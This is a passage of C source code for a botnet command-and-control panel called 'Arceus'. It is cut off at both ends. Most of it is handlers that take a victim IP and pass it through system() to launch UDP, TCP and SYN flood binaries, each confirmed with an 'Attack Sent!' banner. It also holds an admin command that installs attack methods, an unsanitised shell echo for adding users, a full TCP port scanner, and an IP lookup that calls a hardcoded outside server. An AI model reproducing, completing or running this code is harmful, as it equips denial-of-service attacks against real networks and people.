        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mDOMINATE     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mDOMINATE-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".telnet") || strstr(buf, ".TELNET")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/vse %s 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mTELNET       \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mTELNET-IPHM   \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".udpabuse") || strstr(buf, ".UDPABUSE")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/udp_abuse %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mUDPABUSE     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m:\e[38;5;202m UDPABUSE-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".tcpabuse") || strstr(buf, ".TCPABUSE")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/tcp_abuse %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mTCPABUSE     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mTCPABUSE-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".csyn") || strstr(buf, ".CSYN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/csyn %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m:\e[38;5;202m CSYN         \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mCSYN-IPHM     \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".xsyn") || strstr(buf, ".XSYN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/xsyn %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mXSYN         \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mXSYN-IPHM     \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".zsyn") || strstr(buf, ".ZSYN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/zsyn %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mZSYN         \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mZSYN-IPHM     \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".issyn") || strstr(buf, ".ISSYN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/issyn.c %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mISSYN        \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mISSYN-IPHM    \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".essyn") || strstr(buf, ".ESSYN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/essyn.c %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mESSYN        \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mESSYN-IPHM    \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".HUN-FUN") || strstr(buf, ".hun-fun")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./hun-fun %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: HUN-FUN     \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SPECIAL      \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ASS-CRK") || strstr(buf, ".ass-crk")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./ass-crk %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: ASS-CRK     \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SPECIAL      \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".EFT-PWR") || strstr(buf, ".eft-pwr")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./eft-pwr %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: EFT-PWR    \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SPECIAL      \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".PMP-PMP") || strstr(buf, ".pmp-pmp")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./pmp-pmp %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: PMP-PMP    \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SPECIAL      \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ZCH-CRI") || strstr(buf, ".zch-cri")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./zch-cri %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: ZCH-CRI    \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SPECIAL      \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        else if (strstr(buf, ".KILLATTK") || strstr(buf, ".killattk") || strstr(buf, "^[ ") || strstr(buf, "^[")) // System Command Function -- [TESTING HERE]
        {        
        char command[70];
        trim(command);
        strcpy(command, "python scripts/IPHM_Attack_Process_Killer.py" );
        system(command);
        sprintf(botnet, " \r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        else if (strstr(buf, ".nts off") || strstr(buf, ".tfs off") || strstr(buf, ".sds off") || strstr(buf, ".pos off") || strstr(buf, ".cos off") || strstr(buf, ".sos off") || strstr(buf, ".nes off") || strstr(buf, ".mss off") || strstr(buf, ".tss off"))// System Command Function -- [TESTING HERE]
        {        
        char command[70];
        trim(command);
        strcpy(command, "python scripts/IPHM_Scanner_Process_Killer.py" );
        system(command);
        sprintf(botnet, " \r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".install") || strstr(buf, ".INSTALL")) // System Command Function -- [TESTING HERE]
        {
        if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "python install.py" );
        system(command);
        sprintf(botnet, "\e[38;5;93mAll IP-Header Modification Based methods downloaded!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
         if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) // Resolve Command - Function Requires 'resolve.h'
      {
      char *ip[100]; // Char Every Line For Output Communication
      char *token = strtok(buf, " "); // Char Every Line For Output Communication
      char *url = token+sizeof(token); // Char Every Line For Output Communication
      trim(url); // Trim [Url]
      resolve(url, ip); // Using User Input - Stated As 'Url' or 'IP' - We Use This In The Resolver Function
          sprintf(botnet, "\e[38;5;202mResolved \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mto \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", url, ip); // Resolver Output
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
      if(strstr(buf, ".adduser") || strstr(buf, ".ADDUSER") || strstr(buf, "adduser") || strstr(buf, "ADDUSER")) // Add User Function, This Allows Us To Easily Add A New User To The Network, Without Having To Manually Edting The login.txt
      {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
      {
        char *token = strtok(buf, " "); // Char Every Line For Output Communication
        char *userinfo = token+sizeof(token); // Char Every Line For Output Communication
        trim(userinfo); // Trim [Userinfo]
        char *uinfo[50]; // Char Every Line For Output Communication
        sprintf(uinfo, "echo '%s' >> arceus.txt", userinfo); // We Are Editing The Following File --> 'arceus.txt' Which Is Our 'Login.txt'
        system(uinfo); // Access Of System Functions In Order To Edit The File From The Communicating Screen
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mAdded User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, userinfo); // Adding User - Output
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mSuccessfully Added!\r\n", userinfo); // Adding User - Output
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
       sprintf(botnet, "Admins Only!\r\n");
       if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
     }
       }
//       else if(strstr(buf, ".deluser") || strstr(buf, ".DELUSER")
//       {
//           if(strcmp(admin, accounts[find_line].id) == 0)
//           {
//               int kdm;
//               char deluser[50];
//               if(send(thefd, "\x1b[1;36mUsername: \x1b[37m", strlen("\x1b[1;36mUsername: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
//               memset(deluser, 0, sizeof(deluser));
//               while(fdgets(deluser, sizeof deluser, thefd) < 1)
//               {
//                   trim(deluser);
//                   if(strlen(deluser) < 3) continue;
//                   break;
//               }
//               trim(deluser);
//               rmstr(deluser, ACC_FILE);
//               sprintf(botnet, "\x1b[1;36mDeleted User \x1b[0m(\x1b[1;36m%s\x1b[0m)...\r\n", deluser);
//               if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
//               for(kdm = 0; kdm < MAXFDS; kdm++)
//               {
//                   if(!managers[kdm].connected) continue;
//                   if(!strcmp(managers[kdm].user, deluser))
//                   {
//                       close(kdm);
//                       managers[kdm].connected = 0;
//                       memset(managers[kdm].user, 0, sizeof(managers[kdm].user));
//                   }
//               }
//           }
//           else
//           {
//               sprintf(botnet, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
//               if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
//           }
//       }
        else if(strstr(buf, "PORTSCAN") || strstr(buf, "portscan")) // Portscan Function - Easy And Stable Port Scan [II]
        {
            int x; // We State X As The Unknown Integer [This Will Be The User Input]
            int ps_timeout = 3; // Create An Integer For The Time-Out, This Will Minimise Network Saturation
            int least_port = 1; // Create An Integer For The First Port - [We Need A Start Point Of Course]
            int max_port = 65535; // Create An Integer For The First Port - [We Need A End Point Of Course]
            char host[16]; // Char Every Line For Output Communication
            trim(buf); // Trim [Buffer]
            char *token = strtok(buf, " "); // Char Every Line For Output Communication
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1); // Check Host, Create '+1' Token, Then Use 'Botnet'
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mChecking ports \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mthrough \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mFor IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // We Will Terminate Concurrent Function And Carry on.. Use Values As Follows 'x'
            for(x=least_port; x < max_port; x++) // We Start From The Lowest Port To Biggest Port
            {
                int Sock = -1; // Create Integer For Socket - '-1'
                struct timeval timeout; // We Are Creating A Timing System - This Is For Timeout, Creating Struct. For 'timeval-timeout'
                struct sockaddr_in sock; // Struct. Creation Of Sock-Address
                // set timeout secs
                timeout.tv_sec = ps_timeout; // Timeout - tv
                timeout.tv_usec = 0; // Timeout - tv_usec
                Sock = socket(AF_INET, SOCK_STREAM, 0); // Create Our TCP Socket Using AF_INET
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our RCV Time -- [Received]
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our SND Time -- [Sending]
                sock.sin_family = AF_INET; // Socket-Sin, Family -- Using AF_INET
                sock.sin_port = htons(x); // Using 'htons' Set As The 'x' Value
                sock.sin_addr.s_addr = inet_addr(host); // State The 'inet' As The Host, Suffix Has Been Created, So Process Is Independent
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock); // If The Packet Returned, It Will Not Be Displayed
                else
                {        // If The Packet Returns From Handshake, The Port Is Open
                    snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mPort\e[38;5;93m:[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mis open For IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
                    memset(botnet, 0, sizeof(botnet)); // Fill In Data Block, Let's Keep Our Communication Stable
                    close(Sock); // Kill Our Open Socket - TCP
                }
            }                // Scan Is Done -- Output
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mScan on IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mis Done!\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        else if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            char myhost[20]; // Char Every Line For Output Communication
            char ki11[1024]; // Char Every Line For Output Communication // Ip Lookup Function
            snprintf(ki11, sizeof(ki11), "%s", buf); // Using Kill Prefix For Dynamic Integer
            trim(ki11); // Trim [ki11]
            char *token = strtok(ki11, " "); // Char Every Line For Output Communication
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1); // Host Size Statement, This Is For OCMIS [PSL-0012]
            if(atoi(myhost) >= 8) // Bigger Than Int Value Of 8
            {
                int ret; // Create Integer For 'ret' -- Used In Each Value, For Time-Out Sequence
                int IPLSock = -1; // State IPLSOCK == -1 [Shouldn't Class With The Open Socket Via TCP]
                char iplbuffer[1024]; // Char Every Line For Output Communication
                int conn_port = 80; // Set Default Connection Port As [80]
                char iplheaders[1024]; // Char Every Line For Output Communication
                struct timeval timeout; // Create Struct. For Time Interval Timeout
                struct sockaddr_in sock; // Create Another Struct. For Socket-Address -> Socket
                char *iplookup_host = "185.244.25.189"; // Change to Server IP - [EDIT HERE]
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0; // 0 second -- Run Function
                IPLSock = socket(AF_INET, SOCK_STREAM, 0); // Running Socketstream, Using Set Values - We Are Concurrent
                sock.sin_family = AF_INET; // Socket Sin == Sin.family, Engages Better With Output Connection
                sock.sin_port = htons(conn_port); // htons, Is Dependent On The Connection Port -- Integer States Are Constant
                sock.sin_addr.s_addr = inet_addr(iplookup_host); // Coherent Connection - Will Kill Socket If Lookup Is Incomplete
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1) // Check Using IPLSock, If Connection Has Been Reached
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else // Else...
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");                This Below, Is Our Header Sent To The API, This Shouldn't Cause Problems..
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mGathering Information On IP:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", myhost); // IP Info -- Output
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch; // Char Every Line For Output Communication
                        int retrv = 0; // Create Integer For 'Retrv' -- [OPEN INT == 0]
